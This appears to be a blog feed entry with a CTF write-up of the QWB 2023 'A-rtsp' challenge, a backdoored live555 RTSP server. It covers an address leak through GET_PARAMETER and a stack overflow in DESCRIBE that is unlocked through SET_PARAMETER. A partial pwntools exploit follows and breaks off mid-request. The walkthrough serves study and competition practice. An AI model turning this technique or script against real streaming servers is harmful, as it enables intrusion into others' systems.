<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ixout&#39;s blog</title>
  
  
  <link href="https://ixout.github.io/atom.xml" rel="self"/>
  
  <link href="https://ixout.github.io/"/>
  <updated>2024-05-02T08:23:40.552Z</updated>
  <id>https://ixout.github.io/</id>
  
  <author>
    <name>ixout</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phppwn初识</title>
    <link href="https://ixout.github.io/posts/5022/"/>
    <id>https://ixout.github.io/posts/5022/</id>
    <published>2024-05-02T08:23:40.000Z</published>
    <updated>2024-05-02T08:23:40.552Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>强网杯2023两道题</title>
    <link href="https://ixout.github.io/posts/36820/"/>
    <id>https://ixout.github.io/posts/36820/</id>
    <published>2024-04-23T13:48:22.000Z</published>
    <updated>2024-04-26T04:35:14.777Z</updated>
    
    <content type="html"><![CDATA[<h1 id="A-rtsp"><a href="#A-rtsp" class="headerlink" title="A-rtsp"></a>A-rtsp</h1><h2 id="rtsp"><a href="#rtsp" class="headerlink" title="rtsp"></a>rtsp</h2><p>通过搜索字符串rtsp可以知道采用的标准是rtsp1.0</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-23_221908.png" alt=""></p><p>对应的RFC是<a href="https://www.rfc-editor.org/rfc/rfc2326.html">RFC 2326: Real Time Streaming Protocol (RTSP) (rfc-editor.org)</a></p><p>同时参考<a href="https://zhuanlan.zhihu.com/p/478736595">最详细的音视频流媒体传输协议-rtsp协议详解 - 知乎 (zhihu.com)</a>这篇文章</p><p>rtsp协议是啥</p><blockquote><p>RTSP全称实时流协议（Real Time Streaming Protocol），它是一个网络控制协议，设计用于娱乐、会议系统中控制流媒体服务器。RTSP用于在希望通讯的两端建立并控制媒体会话（session），客户端通过发出VCR-style命令如play、record和pause等来实时控制媒体流。</p></blockquote><p>RTSP协议采用客户服务器(CS)方式工作</p><h3 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式"></a>报文格式</h3><p><strong>RTSP客户端的请求格式</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">method url vesion\r\n</span><br><span class="line">CSeq: x\r\n</span><br><span class="line">xxx\r\n</span><br><span class="line">...</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><ul><li>method：方法，表明这次请求的方法</li><li>url：<strong>格式一般为rtsp://ip:port/session</strong>，ip表主机ip，port表端口好，如果不写那么就是默认端口，rtsp的默认端口为554，session表明请求哪一个会话</li><li>version：表示rtsp的版本，现在为RTSP/1.0</li><li>CSeq：序列号，每个RTSP请求和响应都对应一个序列号，序列号是递增的</li></ul><p>一个实例</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-23_223449.png" alt=""></p><p>请求方法有OPTIONS、DESCRIBE、SETUP、TEARDOWN、PLAY、PAUSE、GET_PARAMETER和SET_PARAMETER。</p><p><strong>RTSP服务端的响应格式</strong></p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vesion 200 OK\r\n</span><br><span class="line">CSeq: x\r\n</span><br><span class="line">xxx\r\n</span><br><span class="line">...</span><br><span class="line">\r\n</span><br></pre></td></tr></table></figure><ul><li>version：表示rtsp的版本，现在为RTSP/1.0</li><li>CSeq：序列号，这个必须与对应请求的序列号相同</li></ul><p>状态码</p><ul><li>1xx：信息-已收到请求，正在继续处理</li><li>2xx：成功-成功接收、理解和接受操作</li><li>3xx：重定向-必须执行进一步操作才能完成请求</li><li>4xx：客户端错误-请求包含错误语法或无法实现</li><li>5xx：服务器错误-服务器未能完成明显有效的请求</li></ul><hr><p>更多可以另行学习,对于本题这些知识就够了</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>程序ida打开,哦豁是c++写的,又需要万恶的c++逆向(不过总比rust和go要好)</p><p>万幸的是没有去除符号</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rbx</span></span><br><span class="line">  __int64 (__fastcall *v4)(__int64, __int64); <span class="comment">// r12</span></span><br><span class="line">  __int64 v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v7; <span class="comment">// r8</span></span><br><span class="line">  ServerMediaSubsession *v8; <span class="comment">// rax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int16 v11; <span class="comment">// [rsp+14h] [rbp-4Ch] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12; <span class="comment">// [rsp+17h] [rbp-49h]</span></span><br><span class="line">  ServerMediaSession *v13; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  UsageEnvironment *v14; <span class="comment">// [rsp+20h] [rbp-40h]</span></span><br><span class="line">  UsageEnvironment *v15; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *v16; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  RTSPServer *v17; <span class="comment">// [rsp+38h] [rbp-28h]</span></span><br><span class="line">  __int64 v18; <span class="comment">// [rsp+40h] [rbp-20h]</span></span><br><span class="line">  BasicUsageEnvironment *New; <span class="comment">// [rsp+48h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  New = (BasicUsageEnvironment *)BasicTaskScheduler::createNew(</span><br><span class="line">                                   (BasicTaskScheduler *)&amp;stru_2708.r_info,</span><br><span class="line">                                   (<span class="type">unsigned</span> <span class="type">int</span>)argv);</span><br><span class="line">  env = (UsageEnvironment *)BasicUsageEnvironment::createNew(New, (TaskScheduler *)argv);</span><br><span class="line">  v18 = <span class="number">0LL</span>;</span><br><span class="line">  Port::Port((Port *)&amp;v11, <span class="number">0x216A</span>u);</span><br><span class="line">  v17 = (RTSPServer *)RTSPServer::createNew(env, (<span class="type">unsigned</span> __int16)v11, v18, <span class="number">65LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v17 )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (*(__int64 (__fastcall **)(UsageEnvironment *, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)env + <span class="number">72LL</span>))(</span><br><span class="line">           env,</span><br><span class="line">           <span class="string">&quot;Failed to create RTSP server: &quot;</span>);</span><br><span class="line">    v4 = *(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v3 + <span class="number">72LL</span>);</span><br><span class="line">    v5 = (**(__int64 (__fastcall ***)(UsageEnvironment *))env)(env);</span><br><span class="line">    v6 = v4(v3, v5);</span><br><span class="line">    (*(<span class="type">void</span> (__fastcall **)(__int64, <span class="type">const</span> <span class="type">char</span> *))(*(_QWORD *)v6 + <span class="number">72LL</span>))(v6, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v16 = <span class="string">&quot;Session streamed by \&quot;testOnDemandRTSPServer\&quot;&quot;</span>;</span><br><span class="line">  v15 = (UsageEnvironment *)<span class="string">&quot;wavAudioTest&quot;</span>;</span><br><span class="line">  v14 = (UsageEnvironment *)<span class="string">&quot;test.wav&quot;</span>;</span><br><span class="line">  v13 = (ServerMediaSession *)ServerMediaSession::createNew(</span><br><span class="line">                                env,</span><br><span class="line">                                (UsageEnvironment *)<span class="string">&quot;wavAudioTest&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;wavAudioTest&quot;</span>,</span><br><span class="line">                                <span class="string">&quot;Session streamed by \&quot;testOnDemandRTSPServer\&quot;&quot;</span>,</span><br><span class="line">                                <span class="number">0LL</span>,</span><br><span class="line">                                <span class="number">0</span>,</span><br><span class="line">                                (<span class="type">const</span> <span class="type">char</span> *)argv);</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v8 = (ServerMediaSubsession *)WAVAudioFileServerMediaSubsession::createNew(</span><br><span class="line">                                  env,</span><br><span class="line">                                  v14,</span><br><span class="line">                                  (<span class="type">const</span> <span class="type">char</span> *)(<span class="type">unsigned</span> __int8)reuseFirstSource,</span><br><span class="line">                                  <span class="number">0</span>,</span><br><span class="line">                                  v7);</span><br><span class="line">  ServerMediaSession::addSubsession(v13, v8);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(RTSPServer *, ServerMediaSession *))(*(_QWORD *)v17 + <span class="number">72LL</span>))(v17, v13);</span><br><span class="line">  announceStream(v17, v13, (<span class="type">const</span> <span class="type">char</span> *)v15, (<span class="type">const</span> <span class="type">char</span> *)v14);</span><br><span class="line">  v9 = UsageEnvironment::taskScheduler(env);</span><br><span class="line">  (*(<span class="type">void</span> (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v9 + <span class="number">56LL</span>))(v9, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到有很多没见过的类,搜索一下<code>BasicTaskScheduler</code>,找到关键词<code>live555</code></p><p>继续搜索<code>live555</code>,<a href="https://zhuanlan.zhihu.com/p/678497370">基于Live555框架实现一个实时流媒体服务 - 知乎 (zhihu.com)</a>,可以知道live555是rtsp协议的一种实现</p><p>现在我们有两种办法向下继续分析</p><ol><li><p>既然找到了live555开源项目,那么这类题一般都是在原有代码的基础上做一些修改,所以我们可以自己编译一个live555,然后通过bindiff来找到这些函数</p></li><li><p>第二种方法是比较看观察能力的,而且并不具备普适性,通过找到后门提示中的字符串来定位关键漏洞函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.rodata:000000000007B39B0000001CC100 maybe you need this %p\n</span><br><span class="line">.rodata:000000000007B3C800000022C100 you may want to get more flag</span><br><span class="line">.rodata:000000000007B40B0000000CCvul_string:</span><br></pre></td></tr></table></figure></li></ol><p>总之关键就是在于定位到漏洞函数</p><p>在GET_PARAMETER中存在泄露</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RTSPServer::RTSPClientConnection::handleCmd_GET_PARAMETER(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-100h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s1[<span class="number">215</span>]; <span class="comment">// [rsp+40h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+117h] [rbp-9h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v8; <span class="comment">// [rsp+118h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+11Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  s1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)(a3 - <span class="number">9</span>) &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;GET_INFO:&quot;</span>, &amp;a2[i], <span class="number">9uLL</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i += <span class="number">9</span>; i &lt; a3 &amp;&amp; (a2[i] == <span class="string">&#x27; &#x27;</span> || a2[i] == <span class="number">9</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( v8 &lt;= <span class="number">3</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v7 = a2[i];</span><br><span class="line">        s1[v8++] = v7;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      s1[v8] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;2023&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;100 you may want to get more flag&quot;</span>, <span class="string">&quot;2023.03.30&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x14</span>uLL);</span><br><span class="line">  <span class="built_in">sprintf</span>(s, <span class="string">&quot;100 maybe you need this %p\n&quot;</span>, &amp;gift);</span><br><span class="line">  <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, s, <span class="string">&quot;2023.03.30&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要传输一个标签<code>GET_INFO</code>,值为<code>2023</code></p><p>在DESCRIBE中存在栈溢出漏洞</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> __fastcall RTSPServer::RTSPClientConnection::handleCmd_DESCRIBE(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a3,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a4)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> result; <span class="comment">// al</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">406</span>]; <span class="comment">// [rsp+20h] [rbp-1A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [rsp+1B6h] [rbp-Ah]</span></span><br><span class="line">  <span class="type">char</span> v10; <span class="comment">// [rsp+1B7h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// [rsp+1B8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+1BCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  dest[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">strcat</span>(dest, a2);</span><br><span class="line">    *(_WORD *)&amp;dest[<span class="built_in">strlen</span>(dest)] = <span class="number">47</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcat</span>(dest, a3);</span><br><span class="line">  <span class="keyword">if</span> ( *((_DWORD *)this + <span class="number">10084</span>) == <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(a4) - <span class="number">11</span>;</span><br><span class="line">      result = i;</span><br><span class="line">      <span class="keyword">if</span> ( v4 &lt;= i )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;vul_string:&quot;</span>, &amp;a4[i], <span class="number">0xB</span>uLL) )</span><br><span class="line">      &#123;</span><br><span class="line">        i += <span class="number">11</span>;</span><br><span class="line">        v11 = <span class="built_in">strlen</span>(dest) - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = a4[i];</span><br><span class="line">          v9 = a4[i + <span class="number">1</span>];</span><br><span class="line">          <span class="keyword">if</span> ( v10 == <span class="number">13</span> &amp;&amp; v9 == <span class="number">10</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          dest[v11++] = v10;</span><br><span class="line">          ++i;</span><br><span class="line">        &#125;</span><br><span class="line">        result = v11;</span><br><span class="line">        dest[v11] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)RTSPServer::RTSPClientConnection::authenticationOK(this, <span class="string">&quot;DESCRIBE&quot;</span>, dest, a4) == <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !result )</span><br><span class="line">      <span class="keyword">return</span> (*(__int64 (__fastcall **)(_QWORD, <span class="type">char</span> *, __int64 (__fastcall *)(RTSPServer::RTSPClientConnection *__hidden, <span class="type">void</span> *, ServerMediaSession *), RTSPServer::RTSPClientConnection *, __int64))(**((_QWORD **)this + <span class="number">1</span>) + <span class="number">80LL</span>))(</span><br><span class="line">               *((_QWORD *)this + <span class="number">1</span>),</span><br><span class="line">               dest,</span><br><span class="line">               RTSPServer::RTSPClientConnection::DESCRIBELookupCompletionFunction,</span><br><span class="line">               this,</span><br><span class="line">               <span class="number">1LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但需要满足一个条件,即<code>if ( *((_DWORD *)this + 10084) == 3 )</code></p><p>这个可以在SET_PARAMETER中实现,传输一个标签<code>DESCRIBE_FLAG</code>,值为<code>flag</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall RTSPServer::RTSPClientConnection::handleCmd_SET_PARAMETER(</span><br><span class="line">        RTSPServer::RTSPClientConnection *this,</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span> *a2,</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> a3)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">215</span>]; <span class="comment">// [rsp+20h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v6; <span class="comment">// [rsp+F7h] [rbp-9h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+F8h] [rbp-8h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+FCh] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  s1[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; (<span class="type">int</span>)(a3 - <span class="number">14</span>) &gt; (<span class="type">int</span>)i; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !strncasecmp(<span class="string">&quot;DESCRIBE_FLAG:&quot;</span>, &amp;a2[i], <span class="number">0xE</span>uLL) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( i += <span class="number">14</span>; i &lt; a3 &amp;&amp; (a2[i] == <span class="number">32</span> || a2[i] == <span class="number">9</span>); ++i )</span><br><span class="line">        ;</span><br><span class="line">      v7 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ( i &lt; a3 )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = a2[i];</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">13</span> || v6 == <span class="number">10</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        s1[v7++] = v6;</span><br><span class="line">        ++i;</span><br><span class="line">      &#125;</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;qwb&quot;</span>) )</span><br><span class="line">    <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;200 OK&quot;</span>);</span><br><span class="line">  *((_DWORD *)this + <span class="number">10084</span>) = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">return</span> RTSPServer::RTSPClientConnection::setRTSPResponse(this, <span class="string">&quot;202 OK&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是栈溢出orw</p><p><strong>exp:</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context(os = &#x27;linux&#x27;, arch = &#x27;amd64&#x27;, log_level = &#x27;info&#x27;)</span></span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">8554</span>)</span><br><span class="line"><span class="comment">#p = remote(&quot;8.147.132.53&quot;,36720)</span></span><br><span class="line"><span class="comment">#p =  process(&#x27;./A-rtsp&#x27;)</span></span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line">r = <span class="keyword">lambda</span>              : p.recv(<span class="number">4096</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> a=<span class="literal">False</span>     : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x             : p.recvn(x)</span><br><span class="line">s = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x           : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b         : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span>           : u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span>           : u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line">lg = <span class="keyword">lambda</span> s,addr      : log.info(<span class="string">&#x27;\033[1;31;40m %s --&gt; 0x%x \033[0m&#x27;</span> % (s,addr))</span><br><span class="line"><span class="comment">#-----------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;GET_PARAMETER rtsp://192.168.127.133:8554/* RTSP/1.0\r\nCSeq: 2\r\nGET_INFO: 2023\r\n\r\n&#x27;</span>)</span><br><span class="line">baseaddr = <span class="built_in">int</span>(rl(<span class="string">&quot;0\n&#x27;&quot;</span>)[-<span class="number">15</span>:],<span class="number">16</span>)-<span class="number">0x2A9990</span></span><br><span class="line"><span class="comment">#codebase = rl(&quot;0\n&#x27;&quot;)</span></span><br><span class="line"><span class="built_in">print</span>(baseaddr)</span><br><span class="line"></span><br><span class="line">s(<span class="string">b&#x27;SET_PARAMETER rtsp://192.168.127.133:8554/* RTSP/1.0\r\nDESCRIBE_FLAG: 